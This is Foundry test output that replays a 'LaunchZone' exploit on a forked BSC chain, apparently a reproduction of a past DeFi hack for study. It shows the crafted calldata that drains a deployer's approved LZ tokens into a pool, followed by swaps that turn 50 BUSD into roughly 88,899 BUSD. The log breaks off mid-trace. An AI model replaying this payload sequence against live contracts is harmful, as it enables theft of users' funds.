Compiling 22 files with Solc 0.8.28
Solc 0.8.28 finished in 1.07s
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 604.36ms (1.76ms CPU time)

Ran 1 test for src/test/2023-02/LaunchZone_exp.sol:LaunchZoneExploit
[PASS] testExploit() (gas: 581910)
Logs:
  Running on BSC at :  26024419
  BscexDeployer LZ Balalnce 9886961355188035733617076
  LZ allowance to swapXImp 999998300
  Payload delivered true
  BscexDeployer BUSD Balalnce 11525
  attacker BUSD Balalnce 50
  amounts BUSD/LZ 50 9886999
  attacker LZ Balalnce 9886999
  attacker BUSD Balalnce 0
  amounts LZ/BUSD 9886999 88899
  attacker BUSD Balalnce 88899

Traces:
  [103084] thisContract::setUp()
    ├─ [0] VM::createSelectFork("bsc", 26024419 [2.602e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], "BscexDeployer")
    │   └─ ← [Return]
    ├─ [0] VM::label(LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], "LZ")
    │   └─ ← [Return]
    ├─ [0] VM::label(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], "BUSD")
    │   └─ ← [Return]
    ├─ [0] VM::label(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], "BISWAP")
    │   └─ ← [Return]
    ├─ [0] VM::label(BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], "BISWAP Router")
    │   └─ ← [Return]
    ├─ [0] VM::label(attacker: [0x1C2B102f22c08694EEe5B1f45E7973b6EACA3e92], "attacker")
    │   └─ ← [Return]
    ├─ [0] VM::label(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], "thisContract")
    │   └─ ← [Return]
    └─ ← [Stop]

  [732653] thisContract::testExploit()
    ├─ [0] console::log("Running on BSC at : ", 26024419 [2.602e7]) [staticcall]
    │   └─ ← [Stop]
    ├─ [2553] LZ::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   └─ ← [Return] 9886961355188035733617076 [9.886e24]
    ├─ [0] console::log("BscexDeployer LZ Balalnce", 9886961355188035733617076 [9.886e24]) [staticcall]
    │   └─ ← [Stop]
    ├─ [2639] LZ::allowance(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01) [staticcall]
    │   └─ ← [Return] 999998300000000000000000000 [9.999e26]
    ├─ [0] console::log("LZ allowance to swapXImp", 999998300 [9.999e8]) [staticcall]
    │   └─ ← [Stop]
    ├─ [119559] 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01::4f1f05bc(00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2531] BUSD::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   │   └─ ← [Return] 11518714537487760350735 [1.151e22]
    │   ├─ [531] BUSD::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   │   └─ ← [Return] 11518714537487760350735 [1.151e22]
    │   ├─ [968] 0x6d1879F4151b7F3958b8F5a9cc5e2cc93B95e50D::pairFor(0x858E3312ed3A876947EA49d572A7C42DE08af7EE, LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xfea293c909d87cd4153593f077b76bb7e94340200f4ee84211ae8e4f9bd7ffdf) [delegatecall]
    │   │   └─ ← [Return] 0x000000000000000000000000db821bb482cfdae5d3b1a48eead8d2f74678d593
    │   ├─ [37853] LZ::transferFrom(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], 9886961355188035733617076 [9.886e24])
    │   │   ├─ emit Transfer(param0: BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], param1: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param2: 9886961355188035733617076 [9.886e24])
    │   │   ├─ emit LOG_UNLOCK_TRANSFER(param0: BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], param1: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param2: 9886961355188035733617076 [9.886e24])
    │   │   ├─ emit Approval(param0: BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], param1: 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01, param2: 990111338644811964266382924 [9.901e26])
    │   │   ├─  storage changes:
    │   │   │   @ 0x2d77b0dc20aa700d73c05f0cf6e65b4f3b66f39e366237aa1f23a0360e6f5af8: 0x000000000000000000000000000000000000000000082da53fc059357f82f9b4 → 0
    │   │   │   @ 0x79108d0b1c1ce4d54a39c1aeed3a42465dc896c57172536ba513939e676e8568: 0x000000000000000000000000000000000000000000082da53fc059357f82f9b4 → 0
    │   │   │   @ 0xcb50e617a77c8f15d7800e3697af3f1e97c339eeaacfed3f20278b94d8a0d2ef: 0x0000000000000000000000000000000000000000000000026db9e5f974ec3fc7 → 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b
    │   │   │   @ 0xa2ef515d576cfe9a19561dd59b086b96a8de13d27ee8e723aee6b822d21b0913: 0x0000000000000000000000000000000000000000000000026db9e5f974ec3fc7 → 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b
    │   │   │   @ 0x3c673c338968b1365d859ca2a006a69b1dc614a336969a27f4db146a3d399f0b: 0x0000000000000000000000000000000000000000033b2de077933f3953f00000 → 0x00000000000000000000000000000000000000000333003b37d2e603d46d064c
    │   │   └─ ← [Return] true
    │   ├─ [2459] BISWAP::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000026db9e5f974ec3fc700000000000000000000000000000000000000000000000060d885fc15ea60ef0000000000000000000000000000000000000000000000000000000063fb37e9
    │   ├─ [2380] BISWAP::swapFee() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000002
    │   ├─ [553] LZ::balanceOf(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]) [staticcall]
    │   │   └─ ← [Return] 9887006155279663549593979 [9.887e24]
    │   ├─ [43410] BISWAP::swap(0, 6978443256059505388 [6.978e18], BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 0x)
    │   │   ├─ [10871] BUSD::transfer(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 6978443256059505388 [6.978e18])
    │   │   │   ├─ emit Transfer(param0: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param1: BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], param2: 6978443256059505388 [6.978e18])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x79108d0b1c1ce4d54a39c1aeed3a42465dc896c57172536ba513939e676e8568: 0x0000000000000000000000000000000000000000000002706e46b31475dfde0f → 0x000000000000000000000000000000000000000000000270cf1f1c3f788588fb
    │   │   │   │   @ 0xcb50e617a77c8f15d7800e3697af3f1e97c339eeaacfed3f20278b94d8a0d2ef: 0x00000000000000000000000000000000000000000000000060d885fc15ea60ef → 0x00000000000000000000000000000000000000000000000000001cd11344b603
    │   │   │   └─ ← [Return] true
    │   │   ├─ [553] LZ::balanceOf(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]) [staticcall]
    │   │   │   └─ ← [Return] 9887006155279663549593979 [9.887e24]
    │   │   ├─ [531] BUSD::balanceOf(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]) [staticcall]
    │   │   │   └─ ← [Return] 31684297012739 [3.168e13]
    │   │   ├─ emit Sync(: 9887006155279663549593979 [9.887e24], : 31684297012739 [3.168e13])
    │   │   ├─ emit Swap(param0: 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01, param1: 9886961355188035733617076 [9.886e24], param2: 0, param3: 0, param4: 6978443256059505388 [6.978e18], param5: BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307])
    │   │   ├─  storage changes:
    │   │   │   @ 9: 0x000000000000000000000000000001b8a86de3ac79016e6d9ffd4d7aa07cd45e → 0x000000000000000000000000000001b8d604960230a9f087adb3dd13d124f713
    │   │   │   @ 10: 0x000000000000000000000000000008eb4b2fb12b42a8cade25de1366f9b50268 → 0x000000000000000000000000000008f2a20ae99f430ec752e86d5d48f53adefd
    │   │   │   @ 8: 0x63fb37e900000000000060d885fc15ea60ef0000000000026db9e5f974ec3fc7 → 0x63fc5c9400000000000000001cd11344b603000000082da7ad7a3f2ef46f397b
    │   │   └─ ← [Stop]
    │   ├─ [531] BUSD::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   │   └─ ← [Return] 11525692980743819856123 [1.152e22]
    │   ├─ [531] BUSD::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   │   └─ ← [Return] 11525692980743819856123 [1.152e22]
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000060d8692b02a5aaec
    ├─ [0] console::log("Payload delivered", true) [staticcall]
    │   └─ ← [Stop]
    ├─ [531] BUSD::balanceOf(BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]) [staticcall]
    │   └─ ← [Return] 11525692980743819856123 [1.152e22]
    ├─ [0] console::log("BscexDeployer BUSD Balalnce", 11525 [1.152e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [2531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56])
    │   └─ ← [Return] [0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96], []
    ├─ [0] VM::load(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], slot: 81201235000773904770131445719184449197250777359516868712991521815545917127830 [8.12e76])
    ├─ [0] VM::load(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ emit SlotFound(who: BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 81201235000773904770131445719184449197250777359516868712991521815545917127830 [8.12e76])
    ├─ [0] VM::load(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x000000000000000000000000000000000000000000000002b5e3af16b1880000)
    │   └─ ← [Return]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 50000000000000000000 [5e19]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 50000000000000000000 [5e19]
    ├─ [0] console::log("attacker BUSD Balalnce", 50) [staticcall]
    │   └─ ← [Stop]
    ├─ [24562] BUSD::approve(BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], 50000000000000000000 [5e19])
    │   ├─ emit Approval(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], param2: 50000000000000000000 [5e19])
    │   ├─  storage changes:
    │   │   @ 0xb96dca3b8cbb86adb790f0cfc85b2feddac1a719eb144a7109c9141980a9d548: 0 → 0x000000000000000000000000000000000000000000000002b5e3af16b1880000
    │   └─ ← [Return] true
    ├─ [5704] BISWAP Router::getAmountsOut(50000000000000000000 [5e19], [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2]) [staticcall]
    │   ├─ [459] BISWAP::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b00000000000000000000000000000000000000000000000000001cd11344b6030000000000000000000000000000000000000000000000000000000063fc5c94
    │   ├─ [380] BISWAP::swapFee() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000002
    │   └─ ← [Return] [50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24]]
    ├─ [0] console::log("amounts BUSD/LZ", 50, 9886999 [9.886e6]) [staticcall]
    │   └─ ← [Stop]
    ├─ [115208] BISWAP Router::swapExactTokensForTokens(50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24], [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1677483156 [1.677e9])
    │   ├─ [459] BISWAP::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b00000000000000000000000000000000000000000000000000001cd11344b6030000000000000000000000000000000000000000000000000000000063fc5c94
    │   ├─ [380] BISWAP::swapFee() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000002
    │   ├─ [6034] BUSD::transferFrom(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], 50000000000000000000 [5e19])
    │   │   ├─ emit Transfer(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param2: 50000000000000000000 [5e19])
    │   │   ├─ emit Approval(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], param2: 0)
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000002b5e3af16b1880000 → 0
    │   │   │   @ 0xcb50e617a77c8f15d7800e3697af3f1e97c339eeaacfed3f20278b94d8a0d2ef: 0x00000000000000000000000000000000000000000000000000001cd11344b603 → 0x000000000000000000000000000000000000000000000002b5e3cbe7c4ccb603
    │   │   │   @ 0xb96dca3b8cbb86adb790f0cfc85b2feddac1a719eb144a7109c9141980a9d548: 0x000000000000000000000000000000000000000000000002b5e3af16b1880000 → 0
    │   │   └─ ← [Return] true
    │   ├─ [18898] 0x785E76678e04aD2aC481fcdbE9064b00Dd8651e3::swap(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], 9886999877471233034310454 [9.886e24])
    │   │   ├─ [11564] 0x095Cfb72598d498456b7650178D47f490eB587Ea::swap(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], 9886999877471233034310454 [9.886e24]) [delegatecall]
    │   │   │   ├─ [2536] 0x04eFD76283A70334C72BB4015e90D034B9F3d245::feeDistribution(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [75160] BISWAP::swap(9886999877471233034310454 [9.886e24], 0, thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [61837] LZ::transfer(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9886999877471233034310454 [9.886e24])
    │   │   │   ├─ emit Transfer(param0: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param1: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 9886999877471233034310454 [9.886e24])
    │   │   │   ├─ emit LOG_UNLOCK_TRANSFER(param0: BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], param1: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 9886999877471233034310454 [9.886e24])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x000000000000000000000000000000000000000000082da7565afdad579e5336
    │   │   │   │   @ 0xa2ef515d576cfe9a19561dd59b086b96a8de13d27ee8e723aee6b822d21b0913: 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b → 0x000000000000000000000000000000000000000000000000571f41819cd0e645
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000082da7565afdad579e5336
    │   │   │   │   @ 0xcb50e617a77c8f15d7800e3697af3f1e97c339eeaacfed3f20278b94d8a0d2ef: 0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b → 0x000000000000000000000000000000000000000000000000571f41819cd0e645
    │   │   │   └─ ← [Return] true
    │   │   ├─ [553] LZ::balanceOf(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]) [staticcall]
    │   │   │   └─ ← [Return] 6277808430515283525 [6.277e18]
    │   │   ├─ [531] BUSD::balanceOf(BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]) [staticcall]
    │   │   │   └─ ← [Return] 50000031684297012739 [5e19]
    │   │   ├─ emit Sync(: 6277808430515283525 [6.277e18], : 50000031684297012739 [5e19])
    │   │   ├─ emit Swap(param0: BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], param1: 0, param2: 50000000000000000000 [5e19], param3: 9886999877471233034310454 [9.886e24], param4: 0, param5: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 8: 0x63fc5c9400000000000000001cd11344b603000000082da7ad7a3f2ef46f397b → 0x63fc5c94000000000002b5e3cbe7c4ccb603000000000000571f41819cd0e645
    │   │   └─ ← [Stop]
    │   └─ ← [Return] [50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24]]
    ├─ [553] LZ::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9886999877471233034310454 [9.886e24]
    ├─ [0] console::log("attacker LZ Balalnce", 9886999 [9.886e6]) [staticcall]
    │   └─ ← [Stop]
    ├─ [531] BUSD::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("attacker BUSD Balalnce", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [553] LZ::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9886999877471233034310454 [9.886e24]
    ├─ [9611] 0x10ED43C718714eb63d5aA57B78B54704E256024E::getAmountsOut(9886999877471233034310454 [9.886e24], [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]) [staticcall]
    │   ├─ [2893] 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000089ac00763cb6c7034778000000000000000000000000000000000000000000001410f785b9990f4d0d670000000000000000000000000000000000000000000000000000000063fc513e
    │   └─ ← [Return] [9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22]]
    ├─ [0] console::log("amounts LZ/BUSD", 9886999 [9.886e6], 88899 [8.889e4]) [staticcall]
    │   └─ ← [Stop]
    ├─ [553] LZ::balanceOf(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9886999877471233034310454 [9.886e24]
    ├─ [24609] LZ::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 9886999877471233034310454 [9.886e24])
    │   ├─ emit Approval(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param2: 9886999877471233034310454 [9.886e24])
    │   ├─  storage changes:
    │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0x000000000000000000000000000000000000000000082da7565afdad579e5336
    │   └─ ← [Return] true
    ├─ [95932] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(9886999877471233034310454 [9.886e24], 88899893394357481466597 [8.889e22], [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1677483156 [1.677e9])
    │   ├─ [893] 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000089ac00763cb6c7034778000000000000000000000000000000000000000000001410f785b9990f4d0d670000000000000000000000000000000000000000000000000000000063fc513e
    │   ├─ [24283] LZ::transferFrom(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE, 9886999877471233034310454 [9.886e24])
    │   │   ├─ emit Transfer(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE, param2: 9886999877471233034310454 [9.886e24])
    │   │   ├─ emit LOG_UNLOCK_TRANSFER(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE, param2: 9886999877471233034310454 [9.886e24])
    │   │   ├─ emit Approval(param0: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param2: 0)
    │   │   ├─  storage changes:
    │   │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0x000000000000000000000000000000000000000000082da7565afdad579e5336 → 0
    │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000082da7565afdad579e5336 → 0
    │   │   │   @ 0x6a02b0f5c1327822f47942ad8be6e13f596a4b5bd4b7cf39be70890b87c2a2e4: 0x0000000000000000000000000000000000000000000089ac00763cb6c7034778 → 0x00000000000000000000000000000000000000000008b75356d13a641ea19aae
    │   │   │   @ 0xba6c37faa163564840aefc7150b06f8b4d884388fe3318e24f99e9df234df218: 0x0000000000000000000000000000000000000000000089ac00763cb6c7034778 → 0x00000000000000000000000000000000000000000008b75356d13a641ea19aae
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000082da7565afdad579e5336 → 0
    │   │   └─ ← [Return] true
    │   ├─ [62367] 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE::swap(0, 88899893394357481466597 [8.889e22], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [27971] BUSD::transfer(thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88899893394357481466597 [8.889e22])
    │   │   │   ├─ emit Transfer(param0: 0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE, param1: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 88899893394357481466597 [8.889e22])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x6a02b0f5c1327822f47942ad8be6e13f596a4b5bd4b7cf39be70890b87c2a2e4: 0x000000000000000000000000000000000000000000001410f785b9990f4d0d67 → 0x00000000000000000000000000000000000000000000013db1aa6b406a1ba282
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x0000000000000000000000000000000000000000000012d345db4e58a5316ae5
    │   │   │   └─ ← [Return] true
    │   │   ├─ [553] LZ::balanceOf(0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE) [staticcall]
    │   │   │   └─ ← [Return] 10537136958885855443917486 [1.053e25]
    │   │   ├─ [531] BUSD::balanceOf(0x2d518FdCc1c8E89B1Abc6Ed73B887e12e61F06DE) [staticcall]
    │   │   │   └─ ← [Return] 5860420034181084193410 [5.86e21]
    │   │   ├─ emit Sync(: 10537136958885855443917486 [1.053e25], : 5860420034181084193410 [5.86e21])
    │   │   ├─ emit Swap(param0: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param1: 9886999877471233034310454 [9.886e24], param2: 0, param3: 0, param4: 88899893394357481466597 [8.889e22], param5: thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 10: 0x0000000000000000000000000000097d1491b4eecdb14b480b2ec77222a2a7e5 → 0x0000000000000000000000000000097d6257eae1f07a83988abe91db2bfae04d
